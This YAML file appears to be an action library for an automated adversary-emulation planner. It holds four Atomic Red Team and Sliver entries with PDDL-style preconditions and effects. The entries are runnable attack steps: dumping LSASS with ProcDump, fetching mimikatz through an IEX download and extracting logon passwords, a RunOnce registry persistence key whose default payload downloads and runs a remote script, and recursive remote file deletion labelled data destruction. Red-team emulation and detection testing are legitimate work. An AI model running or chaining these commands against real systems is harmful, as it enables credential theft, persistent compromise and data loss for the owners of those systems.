  - uuid: art-t1003_001-procdump-mini-dump
    name: Create Mini Dump of LSASS.exe using ProcDump
    id:
      - T1003.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - 'OS Credential Dumping: LSASS Memory'
    description: |
      Sysinternals ProcDump with `-mm` (mini-dump, smaller than -ma but
      still contains cred material sekurlsa can parse). Method 3 folds the
      ProcDump staging (Sysinternals Procdump.zip download + extract). ART
      auto_generated_guid 7cede33f-0acd-44ef-9774-15511300b24b.
    execution:
      executor: Powershell Executor
      command: |
        $procdump = "#{procdump_exe}"
        if (-not (Test-Path $procdump)) {
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          $zipPath = "$env:TEMP\Procdump.zip"
          $extractDir = "$env:TEMP\Procdump"
          Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile $zipPath
          Expand-Archive $zipPath $extractDir -Force
          New-Item -ItemType Directory (Split-Path $procdump) -Force | Out-Null
          Copy-Item "$extractDir\Procdump.exe" $procdump -Force
        }
        & $procdump -accepteula -mm lsass.exe "#{output_file}"
    arguments:
      executor:
        description: The Powershell session ID used to invoke ProcDump.
        required: true
        pddl_index: executor0_var_in_plan
      procdump_exe:
        default: C:\Users\Public\procdump.exe
        description: Target-side path where ProcDump is staged and invoked.
        required: true
      output_file:
        default: C:\Windows\Temp\lsass_dump.dmp
        description: Target-side path for the resulting LSASS mini memory dump.
        required: true
        pddl_index: string2_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (file-exists ?path - string ?f - file ?target - host)
      - (lsass-dump-file ?f - file)
      - (callback-covered ?f - file)
  - uuid: art-t1003_001-mimikatz-offline-dump
    name: Offline Credential Theft With Mimikatz
    id:
      - T1003.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - 'OS Credential Dumping: LSASS Memory'
    description: |
      Mimikatz `sekurlsa::minidump <dumpfile>; sekurlsa::logonpasswords full`
      processes an already-existing LSASS memory dump on target and prints
      credential material to stdout. Chain-composition consumer: pair with
      any dumper that emits `(lsass-dump-file …)` — ProcDump, NanoDump,
      comsvcs.dll, rdrleakdiag, Out-Minidump, Silent Process Exit. Method 3
      folds mimikatz staging (fetch latest release from GitHub API + unzip
      via ART's Invoke-FetchFromZip helper). ART auto_generated_guid
      453acf13-1dbd-47d7-b28a-172ce9228023.
    execution:
      executor: Powershell Executor
      command: |
        $mimikatz = "#{mimikatz_exe}"
        if (-not (Test-Path $mimikatz)) {
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (Invoke-WebRequest 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1' -UseBasicParsing).Content
          $releases = (Invoke-WebRequest 'https://api.github.com/repos/gentilkiwi/mimikatz/releases' -UseBasicParsing | ConvertFrom-Json)
          $zipUrl = $releases[0].assets.browser_download_url | Where-Object { $_.EndsWith('.zip') } | Select-Object -First 1
          $basePath = Split-Path (Split-Path $mimikatz)
          New-Item -ItemType Directory $basePath -Force | Out-Null
          Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
        }
        & $mimikatz "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" "exit"
    arguments:
      executor:
        description: The Powershell session ID used to invoke mimikatz.
        required: true
        pddl_index: executor0_var_in_plan
      mimikatz_exe:
        default: C:\Users\Public\x64\mimikatz.exe
        description: Target-side path where mimikatz is staged and invoked.
        required: true
      input_file:
        description: Path to an existing LSASS memory dump file on the target (produced
          by an earlier dumper action).
        required: true
        pddl_index: string2_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
      - (file-exists ?path - string ?f - file ?target - host)
      - (lsass-dump-file ?f - file)
    effects:
      - (credential-data ?d - data ?target - host)
      - (data-stored-c2 ?d - data)
  - uuid: art-t1547_001-powershell-runonce
    name: PowerShell Registry RunOnce
    id:
      - T1547.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Persistence
    technique:
      - 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
    description: |
      Sets `NextRun` under a Run/RunOnce registry path via PowerShell's
      `Set-ItemProperty`. Payload runs at next system boot. Demonstrates
      the PowerShell variant of the classic Run-key persistence pattern.
      ART auto_generated_guid eb44f842-0457-4ddc-9b92-c4caa144ac42.
    execution:
      executor: Powershell Executor
      command: |
        Set-ItemProperty "#{reg_key_path}" "NextRun" '#{command_to_execute}'
    arguments:
      executor:
        description: The Powershell session ID used to invoke Set-ItemProperty.
        required: true
        pddl_index: executor0_var_in_plan
      reg_key_path:
        default: HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
        description: Registry path for the RunOnce entry.
        required: true
      command_to_execute:
        default: powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('https://example.com/payload.ps1')
        description: Command line invoked at next system boot.
        required: true
        pddl_index: string4_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (command-execution-at-startup ?c - string ?target - host)
  - uuid: sliver-rm
    name: Remove Remote Path
    id:
      - T1070.004
      - T1485
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Defense Evasion
      - Impact
    technique:
      - |
        Indicator Removal: File Deletion
      - Data Destruction
    description: The `rm(remote_path, recursive=False, force=False)` command removes
      a directory or file(s) from the remote system. Parameters include remote_path
      (remote path), recursive (recursively remove file(s)), and force (forcefully
      remove the file(s)).
    execution:
      executor: Sliver Executor
      command: |
        rm(session_id=#{executor}, remote_path=#{RemotePath}, recursive=#{Recursive}, force=#{Force})
    arguments:
      executor:
        description: The session ID of the active Sliver connection.
        required: true
        pddl_index: executor1_var_in_plan
      RemotePath:
        description: Remote path
        required: true
        pddl_index: string1_var_in_plan
      Recursive:
        description: Recursively remove file(s)
        required: true
      Force:
        description: Forcefully remove the file(s)
        required: true
    preconditions:
      - operator: or
        operands:
          - (os-windows ?target - host)
          - (os-linux ?target - host)
          - (os-macos ?target - host)
      - (sliver-session ?executorID - executor ?target - host)
      - (file-exists ?path - string ?f - file ?target - host)
    effects:
      - (file-deleted ?f - file ?target - host)
